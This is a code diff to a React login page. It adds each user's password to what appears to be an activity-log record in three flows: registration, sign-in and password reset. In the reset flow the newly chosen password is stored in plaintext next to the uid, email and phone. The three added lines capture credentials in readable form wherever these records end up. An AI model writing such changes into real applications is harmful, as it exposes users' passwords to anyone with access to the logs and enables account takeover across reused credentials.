@@ -99,6 +99,7 @@ export default function LoginPage({ onLoginSuccess }) {
       ffUid: newUser.uid,
       email: newUser.email,
       phone: newUser.phone,
+      password: newUser.password,
       details: 'New Player Registration'
     });
 
@@ -138,6 +139,7 @@ export default function LoginPage({ onLoginSuccess }) {
       ffUid: user.uid,
       email: user.email,
       phone: user.phone,
+      password: user.password,
       details: 'Player signed in to app session'
     });
 
@@ -213,6 +215,7 @@ export default function LoginPage({ onLoginSuccess }) {
         ffUid: res.user?.uid || recoverIdentifier,
         email: res.user?.email || 'N/A',
         phone: res.user?.phone || recoverPhone,
+        password: newResetPassword.trim(),
         details: 'Player self-service password reset'
       });
       setTimeout(() => {
